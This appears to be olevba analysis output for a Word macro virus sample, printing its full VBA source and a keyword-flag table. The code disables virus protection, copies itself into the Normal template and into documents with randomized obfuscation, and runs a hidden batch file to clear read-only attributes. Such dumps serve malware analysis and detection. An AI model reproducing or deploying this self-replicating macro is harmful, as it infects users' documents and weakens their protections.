olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.c-b6fa6adc894042342573b539026e8cbb40a80e2d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.c-b6fa6adc894042342573b539026e8cbb40a80e2d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 _
      Private Sub Document_New()

End Sub
'70.90379
        Private _
Sub Document_Close()

       On _
Error GoTo skam

     Options.VirusProtection = _
False

 _
SWL

          ABS99
'41.27668
skam:
'58.3359
 _
End Sub

     Private Sub SWL()
'46.298
        If _
Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 _
  For i = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

 _
    d = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

          If Len(d) > 0 _
And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

  While _
Mid(d, Len(d) - 1, 2) = " _"

  i _
= i + 1

 _
   d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
  Wend

 _
  d = e(d)

              ActiveDocument.VBProject.VBComponents(1).CodeModule. _
InsertLines i * 2, d

 _
          End If

 _
Next i

 _
    ActiveDocument.SaveAs AddToRecentFiles:=False

 _
      End If

  End _
Sub

 _
       Private Sub ABS99()

           If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

        f _
(NormalTemplate.FullName)

             For _
i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

 _
     d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
    If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 _
While Mid(d, Len(d) - 1, 2) = " _"

 _
    i = i + 1

 _
 d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
   Wend

 _
 d = e(d)

 _
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d

 _
 End If

 _
    Next i

 _
  NormalTemplate.Save

  End If
'78.44886
             End Sub
'69.6285
 _
  Private Function e(aString) As String

 _
    For i = 1 To Len(aString) - 1

 _
    While Mid(aString, i, 2) = " "

            aString _
= Left(aString, i) & Right(aString, Len(aString) - i - 1)

 _
   Wend

 _
          If Mid(aString, i, 1) = "." Then

        If Not _
Mid(aString, i - 1, 1) = Chr$(34) And Not Mid(aString, i + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

 _
    If Not Mid(aString, i + 1, 1) = Chr$(34) Then

 _
    e = Left(aString, i - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - i)

 _
  For j = 1 To Int(15 * Rnd)

 _
       e = " " & e

 _
  Next j

            Exit Function
'49.20062
 _
       End If

 _
       End If

          Else
'99.14024
 _
        If Mid(aString, i, 1) = " " And Int(3 * Rnd) = 1 And i > 1 Then

              If Not Mid(aString, _
i + 1, 1) = Chr$(34) And Not Mid(aString, i - 1, 1) = Chr$(34) Then

 _
 e = Left(aString, i - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - i)

 _
         For j = 1 To Int(15 * Rnd)

 _
e = " " & e

    Next j
'25.8442
 _
Exit Function

 _
   End If

 _
          End If

 _
   End If

 _
         Next i

   e _
= aString & Chr$(13) & "'" & (100 * Rnd)

 _
Count = Int(15 * Rnd)

         For j = 1 _
To Count

 _
        e = " " & e

        Next j
'49.9257
 _
         End Function

 _
   Private Sub f(fName)

 _
        If GetAttr(fName) And vbReadOnly Then

 _
 Open Dir(fName) & ".bat" For Append As #1

 _
 Print #1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

           Print _
#1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

 _
      Close #1

 _
 shellResult = Shell(Dir(fName) & ".bat", vbHide)

             End If
'58.24844
      End Sub
'73.35107
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
